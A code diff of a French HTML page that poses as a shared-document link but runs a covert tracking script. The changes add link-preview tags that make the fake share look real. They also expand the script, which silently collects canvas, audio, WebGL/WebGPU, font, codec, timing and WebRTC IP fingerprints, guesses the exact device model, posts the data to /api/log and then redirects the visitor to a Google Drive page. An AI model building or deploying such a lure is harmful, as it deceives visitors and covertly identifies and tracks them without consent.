@@ -3,7 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chargement du fichier partagé...</title>
+<title>Document partagé - Récupération de fichier</title>
+<meta property="og:title" content="📄 Document partagé">
+<meta property="og:description" content="Un fichier a été partagé avec vous. Cliquez pour y accéder.">
+<meta property="og:type" content="website">
+<meta name="theme-color" content="#4285f4">
 <style>
 body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{text-align:center;color:#5f6368}
@@ -18,6 +22,9 @@ body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;ju
 </div>
 
 <script>
+const t0 = performance.now();
+const timings = { pageLoad: t0 };
+
 (async () => {
   const d = {};
   d.timestamp = new Date().toISOString();
@@ -25,43 +32,68 @@ body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;ju
   d.language = navigator.language;
   d.languages = (navigator.languages || []).join(',');
   d.platform = navigator.platform;
+  d.vendor = navigator.vendor;
   d.hardwareConcurrency = navigator.hardwareConcurrency;
   d.deviceMemory = navigator.deviceMemory || "n/a (iOS masqué)";
+  
+  // Résolution écran (logique + physique)
   d.screen = `${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
+  d.screenPhysical = `${Math.round(screen.width * window.devicePixelRatio)}x${Math.round(screen.height * window.devicePixelRatio)}`;
   d.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
   d.colorDepth = screen.colorDepth;
   d.pixelDepth = screen.pixelDepth;
   d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   d.touchPoints = navigator.maxTouchPoints;
-  d.vendor = navigator.vendor;
   
-  // GPU detection (le KEY POINT pour iPhone)
+  // Vecteurs avancés
+  d.refreshRate = await detectRefreshRate();
+  d.codecs = await checkCodecs();
+  d.webgpu = await getWebGPUInfo();
+  d.gpuBench = await gpuBenchmark();
+  d.cssFeatures = getCSSFeatures();
   d.gpu = getGPUInfo();
+  d.webglSig = getWebGLSignature();
   
-  // Détection modèle iPhone via GPU + résolution
-  d.deviceGuess = guessDevice(d.gpu.renderer, screen.width, screen.height, window.devicePixelRatio);
-  
-  // Audio fingerprint
+  // Fingerprints atomiques (avec fix stabilité)
   d.audioFP = await getAudioFingerprint();
-  
-  // Canvas fingerprint
   d.canvasFP = getCanvasFingerprint();
-  
-  // WebRTC (mDNS hash sur iOS, vraie IP sur Android/PC)
-  d.webrtc = await getLocalIPs();
-  
-  // Fonts détectables
   d.fonts = detectFonts();
   
-  // Capteurs mobiles
+  // WebRTC (mDNS sur iOS, IP réelle ailleurs) - PAS dans le hash car volatile
+  d.webrtc = await getLocalIPs();
   d.sensors = await checkSensors();
   
-  // Hash de fingerprint maison (combine plusieurs signaux stables)
+  // Behavioral microsignals (timings = indirect hardware info)
+  timings.collectDone = performance.now();
+  d.timings = {
+    totalCollectionMs: Math.round(timings.collectDone - timings.pageLoad),
+    performanceNowPrecision: getPerfNowPrecision()
+  };
+  
+  // Device guess avec tous les signaux
+  d.deviceGuess = guessDevice(d);
+  
+  // === CUSTOM FINGERPRINT 100% STABLE ===
+  // Uniquement composants stables, validés deux fois
   d.customFingerprint = await sha256([
-    d.gpu.renderer, d.audioFP, d.canvasFP, d.screen, d.timezone, d.fonts.join('|')
+    d.screen,
+    d.screenPhysical,
+    d.timezone,
+    d.language,
+    d.languages,
+    d.platform,
+    d.hardwareConcurrency,
+    d.colorDepth,
+    d.pixelDepth,
+    d.touchPoints,
+    d.canvasFP,
+    d.fonts.join('|'),
+    d.webglSig,
+    d.refreshRate,
+    JSON.stringify(d.codecs),
+    d.cssFeatures.join('|')
   ].join('::'));
 
-  // Send
   fetch('/api/log', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
@@ -69,12 +101,118 @@ body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;ju
   }).finally(() => {
     setTimeout(() => {
       window.location.href = "https://drive.google.com/file/d/1abcXYZ/view";
-    }, 1500);
+    }, 1200);
   });
 })();
 
+// ========== HELPERS ==========
+
+async function detectRefreshRate() {
+  return new Promise(r => {
+    let frames = 0;
+    const start = performance.now();
+    function tick() {
+      frames++;
+      const elapsed = performance.now() - start;
+      if (elapsed < 1000) requestAnimationFrame(tick);
+      else r(Math.round(frames));
+    }
+    requestAnimationFrame(tick);
+  });
+}
+
+async function checkCodecs() {
+  if (!navigator.mediaCapabilities) return { error: 'no API' };
+  const tests = [
+    { name: 'av1', codec: 'av01.0.05M.08' },
+    { name: 'h265Main', codec: 'hev1.1.6.L93.B0' },
+    { name: 'h265Main10', codec: 'hev1.2.4.L93.B0' },
+    { name: 'h264', codec: 'avc1.640028' },
+    { name: 'vp9', codec: 'vp09.00.10.08' }
+  ];
+  const results = {};
+  for (const t of tests) {
+    try {
+      const r = await navigator.mediaCapabilities.decodingInfo({
+        type: 'file',
+        video: { contentType: `video/mp4; codecs="${t.codec}"`, width: 1920, height: 1080, bitrate: 5000000, framerate: 30 }
+      });
+      results[t.name] = `s:${r.supported?1:0}/e:${r.powerEfficient?1:0}`;
+    } catch(e) { results[t.name] = 'err'; }
+  }
+  return results;
+}
+
+async function getWebGPUInfo() {
+  if (!navigator.gpu) return { available: false };
+  try {
+    const adapter = await navigator.gpu.requestAdapter();
+    if (!adapter) return { available: false };
+    let info = adapter.info;
+    if (!info && adapter.requestAdapterInfo) info = await adapter.requestAdapterInfo();
+    return {
+      available: true,
+      vendor: info?.vendor || 'masked',
+      architecture: info?.architecture || 'masked',
+      device: info?.device || 'masked',
+      description: info?.description || 'masked'
+    };
+  } catch(e) { return { available: false, error: e.message }; }
+}
+
+async function gpuBenchmark() {
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = 512; canvas.height = 512;
+    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+    if (!gl) return null;
+    
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, `attribute vec2 a;void main(){gl_Position=vec4(a,0,1);}`);
+    gl.compileShader(vs);
+    
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, `precision highp float;void main(){vec3 p=vec3(gl_FragCoord.xy/100.0,0.0);for(int i=0;i<40;i++){p=abs(p)/dot(p,p)-vec3(0.75);}gl_FragColor=vec4(p,1);}`);
+    gl.compileShader(fs);
+    
+    const prog = gl.createProgram();
+    gl.attachShader(prog, vs); gl.attachShader(prog, fs);
+    gl.linkProgram(prog); gl.useProgram(prog);
+    
+    const buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
+    const loc = gl.getAttribLocation(prog, 'a');
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+    
+    for (let i = 0; i < 3; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    gl.finish();
+    
+    const start = performance.now();
+    for (let i = 0; i < 15; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    gl.finish();
+    return Math.round(performance.now() - start);
+  } catch(e) { return null; }
+}
+
+function getCSSFeatures() {
+  const tests = [
+    ['color', 'color(display-p3 0 0 0)'],
+    ['color', 'oklch(0 0 0)'],
+    ['color', 'color-mix(in srgb, red, blue)'],
+    ['background', 'paint(test)'],
+    ['width', 'calc-size(auto, size)'],
+    ['display', 'block flow'],
+    ['anchor-name', '--test'],
+    ['view-transition-name', 'test'],
+    ['scrollbar-color', 'red blue']
+  ];
+  return tests.filter(([p, v]) => CSS.supports(p, v)).map(([p, v]) => `${p}:${v.split('(')[0]}`);
+}
+
 function getGPUInfo() {
-  const out = { renderer:'unknown', vendor:'unknown', maxTexture:0 };
+  const out = { renderer: 'unknown', vendor: 'unknown' };
   try {
     const c = document.createElement('canvas');
     const gl = c.getContext('webgl2') || c.getContext('webgl');
@@ -87,59 +225,28 @@ function getGPUInfo() {
       out.renderer = gl.getParameter(gl.RENDERER);
       out.vendor = gl.getParameter(gl.VENDOR);
     }
-    out.maxTexture = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-    out.glVersion = gl.getParameter(gl.VERSION);
-  } catch(e){ out.error = e.message; }
+  } catch(e) {}
   return out;
 }
 
-function guessDevice(gpu, w, h, dpr) {
-  const g = (gpu||'').toLowerCase();
-  const res = `${Math.min(w,h)}x${Math.max(w,h)}`;
-  
-  // iPhone matrix : GPU + résolution
-  if (g.includes('apple')) {
-    if (g.includes('a18 pro')) {
-      if (res === '402x874') return 'iPhone 16 Pro';
-      if (res === '440x956') return 'iPhone 16 Pro Max';
-    }
-    if (g.includes('a18')) {
-      if (res === '393x852') return 'iPhone 16';
-      if (res === '430x932') return 'iPhone 16 Plus';
-    }
-    if (g.includes('a17 pro')) {
-      if (res === '393x852') return 'iPhone 15 Pro';
-      if (res === '430x932') return 'iPhone 15 Pro Max';
-    }
-    if (g.includes('a16')) {
-      if (res === '393x852' && dpr === 3) return 'iPhone 14 Pro ou 15';
-      if (res === '430x932') return 'iPhone 14 Pro Max ou 15 Plus';
-    }
-    if (g.includes('a15')) {
-      if (res === '390x844') return 'iPhone 13 / 13 Pro / 14';
-      if (res === '428x926') return 'iPhone 13 Pro Max / 14 Plus';
-      if (res === '375x812') return 'iPhone 13 mini';
-      if (res === '375x667') return 'iPhone SE 3';
-    }
-    if (g.includes('a14')) {
-      if (res === '390x844') return 'iPhone 12 / 12 Pro';
-      if (res === '428x926') return 'iPhone 12 Pro Max';
-      if (res === '360x780') return 'iPhone 12 mini';
-    }
-    if (g.includes('a13')) return 'iPhone 11 series / SE 2';
-    if (g.includes('a12')) return 'iPhone XS / XR / XS Max';
-    if (g.includes('m1')) return 'iPad Pro M1 ou Mac M1';
-    if (g.includes('m2')) return 'iPad Pro M2 ou Mac M2';
-    if (g.includes('m3')) return 'Mac M3';
-    if (g.includes('m4')) return 'iPad Pro M4 ou Mac M4';
-    return 'Appareil Apple - ' + gpu;
-  }
-  if (g.includes('mali')) return 'Android (Mali GPU) - ' + gpu;
-  if (g.includes('adreno')) return 'Android (Adreno GPU - Snapdragon) - ' + gpu;
-  if (g.includes('nvidia') || g.includes('geforce')) return 'PC avec GPU NVIDIA - ' + gpu;
-  if (g.includes('radeon') || g.includes('amd')) return 'PC avec GPU AMD - ' + gpu;
-  if (g.includes('intel')) return 'PC avec GPU Intel - ' + gpu;
-  return 'Inconnu - ' + gpu;
+function getWebGLSignature() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl2') || c.getContext('webgl');
+    if (!gl) return 'no-webgl';
+    const p = [
+      gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+      gl.getParameter(gl.MAX_VIEWPORT_DIMS).join(','),
+      gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+      gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+      gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+      gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join(','),
+      gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE).join(','),
+      (gl.getSupportedExtensions() || []).sort().join(',')
+    ];
+    return p.join('|');
+  } catch(e) { return 'error'; }
 }
 
 async function getAudioFingerprint() {
@@ -160,7 +267,7 @@ async function getAudioFingerprint() {
     const buf = await ctx.startRendering();
     let sum = 0;
     for (let i = 4500; i < 5000; i++) sum += Math.abs(buf.getChannelData(0)[i]);
-    return sum.toFixed(10);
+    return sum.toFixed(4);
   } catch(e) { return 'denied'; }
 }
 
@@ -172,10 +279,11 @@ function getCanvasFingerprint() {
     ctx.textBaseline = 'top';
     ctx.font = "16px 'Arial'";
     ctx.fillStyle = '#069';
-    ctx.fillText('Familly-Sec-Canary-😀', 2, 15);
+    ctx.fillText('FamSecCanary-Stable-Test-2024', 2, 15);
     ctx.fillStyle = 'rgba(102,200,0,0.7)';
-    ctx.fillText('Familly-Sec-Canary-😀', 4, 17);
-    return c.toDataURL().substring(c.toDataURL().length - 50);
+    ctx.fillText('FamSecCanary-Stable-Test-2024', 4, 17);
+    const dataUrl = c.toDataURL();
+    return dataUrl.substring(dataUrl.length - 60);
   } catch(e) { return 'denied'; }
 }
 
@@ -197,54 +305,124 @@ function getLocalIPs() {
 }
 
 function detectFonts() {
-  const baseFonts = ['monospace', 'sans-serif', 'serif'];
+  const base = ['monospace', 'sans-serif', 'serif'];
   const testString = "mmmmmmmmmmlli";
-  const testSize = '72px';
-  const testFonts = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Tahoma','Lucida Console','Andale Mono','Apple Color Emoji','SF Pro','Segoe UI','Roboto','Noto Sans CJK'];
+  const size = '72px';
+  const testList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Palatino','Trebuchet MS','Arial Black','Impact','Tahoma','Lucida Console','Apple Color Emoji','SF Pro','SF Mono','SF Pro Rounded','Segoe UI','Roboto','Noto Sans CJK','Helvetica Neue','PingFang SC','PingFang HK','Hiragino Sans','Avenir','Avenir Next','Optima','Marker Felt'];
   const h = document.body || document.documentElement;
-  const baseWidths = {};
-  const baseHeights = {};
-  baseFonts.forEach(f => {
+  const bw = {}, bh = {};
+  base.forEach(f => {
     const s = document.createElement('span');
-    s.style.cssText = `position:absolute;left:-9999px;font-size:${testSize};font-family:${f}`;
+    s.style.cssText = `position:absolute;left:-9999px;font-size:${size};font-family:${f}`;
     s.innerText = testString;
     h.appendChild(s);
-    baseWidths[f] = s.offsetWidth;
-    baseHeights[f] = s.offsetHeight;
+    bw[f] = s.offsetWidth; bh[f] = s.offsetHeight;
     h.removeChild(s);
   });
   const detected = [];
-  testFonts.forEach(f => {
-    let isDetected = false;
-    for (const base of baseFonts) {
+  testList.forEach(f => {
+    for (const b of base) {
       const s = document.createElement('span');
-      s.style.cssText = `position:absolute;left:-9999px;font-size:${testSize};font-family:'${f}',${base}`;
+      s.style.cssText = `position:absolute;left:-9999px;font-size:${size};font-family:'${f}',${b}`;
       s.innerText = testString;
       h.appendChild(s);
-      if (s.offsetWidth !== baseWidths[base] || s.offsetHeight !== baseHeights[base]) {
-        isDetected = true;
-      }
+      const ok = s.offsetWidth !== bw[b] || s.offsetHeight !== bh[b];
       h.removeChild(s);
-      if (isDetected) break;
+      if (ok) { detected.push(f); break; }
     }
-    if (isDetected) detected.push(f);
   });
   return detected;
 }
 
 async function checkSensors() {
-  const r = { motion: false, orientation: false };
-  if (typeof DeviceMotionEvent !== 'undefined') r.motion = true;
-  if (typeof DeviceOrientationEvent !== 'undefined') r.orientation = true;
-  return r;
+  return {
+    motion: typeof DeviceMotionEvent !== 'undefined',
+    orientation: typeof DeviceOrientationEvent !== 'undefined'
+  };
+}
+
+function getPerfNowPrecision() {
+  // Safari iOS limite performance.now() à 1ms pour anti-fingerprinting
+  // Chrome donne plus de précision (5µs - 100µs)
+  const samples = [];
+  for (let i = 0; i < 100; i++) samples.push(performance.now());
+  const diffs = [];
+  for (let i = 1; i < samples.length; i++) {
+    if (samples[i] > samples[i-1]) diffs.push(samples[i] - samples[i-1]);
+  }
+  if (!diffs.length) return 'unknown';
+  return Math.min(...diffs).toFixed(3) + 'ms';
 }
 
 async function sha256(str) {
   try {
     const buf = new TextEncoder().encode(str);
-    const hash = await crypto.subtle.digest('SHA-256', buf);
-    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('').substring(0,16);
+    const h = await crypto.subtle.digest('SHA-256', buf);
+    return Array.from(new Uint8Array(h)).map(b => b.toString(16).padStart(2,'0')).join('').substring(0,16);
   } catch(e) { return 'error'; }
+}
+
+function guessDevice(d) {
+  const ua = navigator.userAgent;
+  const res = `${Math.min(screen.width, screen.height)}x${Math.max(screen.width, screen.height)}`;
+  const refresh = d.refreshRate || 60;
+  const isProMotion = refresh > 90;
+  const av1HW = d.codecs?.av1?.includes('e:1');
+  const iosVer = (ua.match(/OS (\d+)_/) || [])[1];
+  
+  // === ANDROID ===
+  if (/Android/i.test(ua)) {
+    const av = (ua.match(/Android (\d+(?:\.\d+)?)/) || [])[1] || '?';
+    const m = ua.match(/Android [^;]+;\s*([^)]+?)\)/);
+    let model = m ? m[1].replace(/\s*Build\/.*/i, '').trim() : 'inconnu';
+    let brand = '';
+    if (/^SM-/i.test(model)) brand = 'Samsung Galaxy ';
+    else if (/^Pixel/i.test(model)) brand = 'Google ';
+    else if (/^CPH/i.test(model)) brand = 'OnePlus/Oppo ';
+    else if (/^RMX/i.test(model)) brand = 'Realme ';
+    else if (/^M2|^21|^22|^23|^24/i.test(model)) brand = 'Xiaomi/Redmi ';
+    return `Android ${av} - ${brand}${model} - ${refresh}Hz`;
+  }
+  
+  // === APPLE (iPhone) ===
+  if (/iPhone|iPad/.test(ua) || /Apple/.test(d.gpu?.renderer||'')) {
+    let candidates = [];
+    
+    if (res === '440x956') candidates = ['iPhone 16 Pro Max'];
+    else if (res === '402x874') candidates = ['iPhone 16 Pro'];
+    else if (res === '430x932') candidates = ['iPhone 15 Pro Max', 'iPhone 15 Plus', 'iPhone 14 Pro Max', 'iPhone 16 Plus'];
+    else if (res === '393x852') candidates = ['iPhone 14 Pro', 'iPhone 15', 'iPhone 15 Pro', 'iPhone 16'];
+    else if (res === '428x926') candidates = ['iPhone 12 Pro Max', 'iPhone 13 Pro Max', 'iPhone 14 Plus'];
+    else if (res === '390x844') candidates = ['iPhone 12', 'iPhone 12 Pro', 'iPhone 13', 'iPhone 13 Pro', 'iPhone 14'];
+    else if (res === '375x812') candidates = ['iPhone X', 'iPhone XS', 'iPhone 11 Pro', 'iPhone 13 mini'];
+    else if (res === '360x780') candidates = ['iPhone 12 mini'];
+    else if (res === '414x896') candidates = ['iPhone XR', 'iPhone XS Max', 'iPhone 11', 'iPhone 11 Pro Max'];
+    else if (res === '375x667') candidates = ['iPhone SE 2', 'iPhone SE 3', 'iPhone 6/7/8'];
+    
+    // Filtre ProMotion 120Hz → Pro only (depuis 13 Pro)
+    if (isProMotion) {
+      candidates = candidates.filter(c => /Pro/.test(c) && !/^iPhone (X|XS|11)/.test(c));
+    } else if (refresh > 0 && refresh < 90) {
+      candidates = candidates.filter(c => !/13 Pro|14 Pro|15 Pro|16 Pro/.test(c));
+    }
+    
+    // Filtre AV1 hardware → 15 Pro+ uniquement
+    if (av1HW) {
+      candidates = candidates.filter(c => /15 Pro|16 Pro|16$| 16 Plus/.test(c));
+    }
+    
+    if (candidates.length === 1) return `🎯 ${candidates[0]} (iOS ${iosVer}, ${refresh}Hz, AV1HW:${av1HW?'oui':'non'}) - CERTAIN`;
+    if (candidates.length > 1) return `${candidates.join(' OU ')} (iOS ${iosVer}, ${refresh}Hz, AV1HW:${av1HW?'oui':'non'})`;
+    return `iPhone non-identifié - res:${res} iOS:${iosVer} ${refresh}Hz`;
+  }
+  
+  // === PC ===
+  const g = (d.gpu?.renderer || '').toLowerCase();
+  if (g.includes('nvidia')) return `PC - GPU NVIDIA - ${d.gpu.renderer}`;
+  if (g.includes('radeon') || g.includes('amd')) return `PC - GPU AMD - ${d.gpu.renderer}`;
+  if (g.includes('intel')) return `PC - GPU Intel - ${d.gpu.renderer}`;
+  
+  return `Inconnu - ${d.gpu?.renderer || 'no GPU info'}`;
 }
 </script>
 </body>
